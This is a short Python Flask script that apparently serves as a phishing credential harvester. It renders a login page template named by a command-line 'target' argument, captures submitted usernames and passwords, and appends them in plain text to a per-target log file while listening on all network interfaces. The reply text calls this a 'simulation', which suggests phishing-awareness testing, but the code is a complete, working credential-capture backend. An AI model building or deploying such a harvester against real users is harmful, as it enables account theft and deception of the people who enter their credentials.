from flask import Flask, render_template, request
import sys
import datetime
import os

app = Flask(__name__)
target = sys.argv[1]

@app.route('/')
def index():
    return render_template(f"{target}.html")

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    log_path = f'logs/{target}.txt'
    os.makedirs('logs', exist_ok=True)
    with open(log_path, 'a') as f:
        f.write(f"{datetime.datetime.now()} | USER: {username} | PASS: {password}\n")
    return "<h3>Thank you! Credentials logged for simulation.</h3>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)